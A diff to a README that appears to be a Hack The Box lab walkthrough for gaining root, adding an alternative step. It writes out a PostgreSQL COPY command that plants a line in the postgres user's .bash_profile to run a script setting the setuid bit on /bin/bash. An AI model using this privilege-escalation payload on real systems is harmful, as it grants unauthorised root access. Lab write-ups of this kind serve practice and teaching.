@@ -22,5 +22,10 @@ And run this cmd after.
 Then the last step is:-                          
 ![image](https://github.com/1cYinfinity/htbdownloadroot/assets/55952519/5c471b6b-b8e1-43a3-b685-c40a2f58c260)
 
+                                                                   OR
+
+If above one is not work in some case u can use this "root.py" file from github :-
+NOTE :- Command for psql in box is " COPY (SELECT CAST('python3 /tmp/root.py "chmod +s /bin/bash;"' AS text)) TO '/var/lib/postgresql/.bash_profile'; "
+![image](https://github.com/1cYinfinity/htbdownloadroot/assets/55952519/e2b6acc5-a991-402b-803a-b5cdc9183836)
 
 Done you got the #root
